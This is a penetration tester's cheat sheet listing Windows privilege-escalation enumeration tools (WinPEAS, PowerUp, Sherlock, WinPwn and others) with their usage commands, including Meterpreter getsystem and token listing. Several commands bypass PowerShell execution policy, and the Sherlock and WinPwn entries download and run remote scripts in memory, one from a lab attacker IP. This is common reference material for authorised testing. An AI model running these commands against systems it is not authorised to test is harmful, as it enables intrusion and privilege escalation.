# Tools - Scan for Privilege Escalation

## Binaries

### Watson

Source: <https://github.com/rasta-mouse/Watson>

Enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities

Command:

```bash
Watson.exe
```

### WinPEAS

Source: <https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe>

Command:

```bash
winPEAS.exe
```

### windows-privesc-check2

Source: <https://github.com/pentestmonkey/windows-privesc-check>

Command:

```bash
windows-privesc-check2.exe --audit -a -o report
```

### Meterpreter

Whoami: `getuid`

ExploitSuggester: `run post/multi/recon/local_exploit_suggester`

Get system: `getsystem`

#### Token Impersonation

load incognito

```msf
list_tokens -u      # List tokens by unique groupname
list_tokens -g      # List tokens by unique username
```

### Windows-exploit-suggester

```bash
windows-exploit-suggester --update
windows-exploit-suggester -i SYSTEMINFO -d 2022-05-08-mssb.xls
```

> Info

|Code|Info|
|-|-|
|[E]| Exploit |
|[M]| Metasploit modules|

## Powershell

### PowerUp

Source: <https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1>

> Command

```powershell
powershell -ep bypass
Import-Module .\powerup.ps1
Invoke-AllChecks
```

### Sherlock

Source: <https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1>

Command:

```powershell
iex(new-object net.webclient).downloadstring('http://10.10.14.22:8000/powershell/Sherlock.ps1')

powershell -ep bypass
Import-Module .\Sherlock.ps1
Find-AllVulns
```

### WinPwn

Source: <https://github.com/S3cur3Th1sSh1t/WinPwn>

Source Offline: <https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Offline_WinPwn.ps1>

Command:

```powershell
Import-Module .\WinPwn.ps1
```

or

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')
```

### PrivescCheck

> Source

Source: <https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1>

Command:

```powershell
powershell -ep bypass
Import-Module .\PrivescCheck.ps1

Invoke-PrivescCheck
Invoke-PrivescCheck -Extended 
```
